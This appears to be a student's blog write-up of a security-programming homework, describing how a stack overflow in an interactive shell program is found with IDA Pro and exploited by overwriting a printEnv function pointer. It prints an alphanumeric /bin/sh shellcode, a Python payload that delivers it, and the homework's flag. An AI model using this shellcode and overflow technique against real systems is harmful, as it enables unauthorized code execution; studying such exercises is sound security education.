---
layout: post
title: 'nphw1 Writeup'
category: memo
slug: nphw1-writeup
---
Security Programming Homework 2-1

## Intelligence Gathering

- There is a vulnerability in piece of code which contains `strtok()`
- There is a `call eax` in the binary
- Because it is an interactive shell program, bad characters are 0x00, 0x0a,
  0x2f (filter out by specific function in the program)

## De-complie the binary

It is hard to debug using gdb. A possible method is to use gdbserver to do
remote debugging. But sadly, I do not have time to learn how to use it. Maybe
next time...

So I turned up using IDA Pro to do the static analysis. By decompilation,
bunch of functions showed up:

```
...
frame_dummy
passCmdline
splitCmdline
parseArgv
printEnv
setEnv
getResult
sendResult
closePipes
exeCmd
nextLine
main
passPipe
addPipe
delPipe
...
```

By doing some observation, I picked up three interesting functions for deeper
inspection: `main`, `passCmdline`, `splitCmdline`, `exeCmd`.

| Offset of cmdline | Meaning                               |
| -----------------:| ------------------------------------- |
| 0                 | pointer of whole command line         |
| 1 - 10000         | pointer of each word                  |
| 10001             | number of words in whole command line |
| 10002 - 11001     | single command, seperated by '\|'     |
| 11002             | argc                                  |
| 11003             | not important                         |
| 11004             | stdout                                |
| 11005             | pointer of function printEnv()        |
| 11006             | pointer of string "printenv"          |
| 11007             | pointer of function setEnv()          |

Since the program uses function pointer to call printEnv(), we can simply put
our shellcode to replace the original printEnv() with the aid of buffer
overflow.

According to the table above, stack overflow will happen when we type more than
1000 words in one single command (commands are seperated by '|'). To overwrite
index 11005 with our shellcode, we need to stuff 1003 words in total.

The 1005th word will overwrite the pointer of the string "printenv", which used
to compared to the very first word. When they are equal, the program will run
into printEnv(). So our job is to ensure they will be the same, otherwise it
won't call our shellcode.

## Shellcode

The shellcode for execute `/bin/sh` is showed following, grab from the
Internet. See the references at the end of this article for more information.

```
PYj0X40PPPPQPaJRX4Dj0YIIIII0DN0RX502A05r9sOPTY01A01RX500D05cFZBPTY01SX540D05ZFXbPTYA01A01SX50A005XnRYPSX5AA005nnCXPSX5AA005plbXPTYA01Tx
```

## Exploitation

The first word should be the same as the last word, and the shellcode should be
1004th word. That's all!

```python
payload = 'a ' * 1003
payload += 'PYj0X40PPPPQPaJRX4Dj0YIIIII0DN0RX502A05r9sOPTY01A01RX500D05cFZBPTY01SX540D05ZFXbPTYA01A01SX50A005XnRYPSX5AA005nnCXPSX5AA005plbXPTYA01Tx '
payload += 'a'
```

Don't forget to append a new line character to fire our payload!

## Flag

The flag is `SECPROG{N3tw0rk_Pr0gr4mm1ng_h0m3w0rk_1s_e4s1er}`

## References

- [Linux x86 Shellcoding 101 – Objective: Topics introduction and exit(69) shellcode](http://0xcd80.wordpress.com/2011/04/16/linux-x86-shellcoding-101/)
- [x86 alphanumeric shellcodeを書いてみる](http://inaz2.hatenablog.com/entry/2014/07/11/004655)
